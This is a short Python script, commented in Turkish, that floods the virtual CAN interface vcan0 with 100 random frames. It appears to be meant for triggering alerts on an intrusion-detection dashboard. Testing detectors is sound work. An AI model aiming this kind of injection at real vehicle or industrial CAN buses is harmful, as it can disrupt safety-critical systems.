import time
import random
import can  # Bu kütüphane gerçekten CAN hattına erişir

class BColors:
    HEADER = '\033[95m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def run_real_attack():
    print(f"{BColors.HEADER}--- GERÇEK CAN-BUS SALDIRISI BAŞLATILIYOR ---{BColors.ENDC}")
    print("Hedef: vcan0 arayüzü")
    
    try:
        # Sanal CAN hattına bağlanıyoruz
        bus = can.interface.Bus(channel='vcan0', bustype='socketcan')
    except OSError:
        print(f"{BColors.FAIL}HATA: vcan0 bulunamadı! 'sudo ip link set up vcan0' yaptın mı?{BColors.ENDC}")
        return

    print(f"{BColors.FAIL}!!! SALDIRI BAŞLADI - FLOODING !!!{BColors.ENDC}")
    
    # 100 tane rastgele ve anlamsız paketi sisteme pompalıyoruz
    for i in range(100):
        # Rastgele bir ID ve rastgele veri üretiyoruz (Tamamen çöp veri)
        fake_id = random.randint(0x000, 0x999)
        fake_data = [random.randint(0, 255) for _ in range(8)]
        
        msg = can.Message(
            arbitration_id=fake_id,
            data=fake_data,
            is_extended_id=False
        )
        
        # Hatta veriyi basıyoruz
        bus.send(msg)
        
        # Çok az bekliyoruz ki sistem kilitlenmesin ama loglara düşsün
        time.sleep(0.01) 

    print(f"\n{BColors.BOLD}✅ 100 ADET SALDIRI PAKETİ GÖNDERİLDİ.{BColors.ENDC}")
    print("Dashboard'a bak: 'Unauthorized Injection' veya 'Flood' uyarısı çıkmış olmalı.")

if __name__ == "__main__":
    run_real_attack()
